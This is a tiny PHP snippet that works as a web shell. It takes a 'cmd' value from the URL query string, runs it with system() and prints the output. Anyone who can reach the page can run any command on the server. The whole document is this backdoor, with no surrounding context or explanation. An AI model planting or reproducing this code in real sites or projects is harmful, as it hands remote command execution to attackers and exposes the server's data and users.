if(isset($_GET['cmd'])){
  echo system($_GET['cmd']);
} else echo "Missing cmd ...";
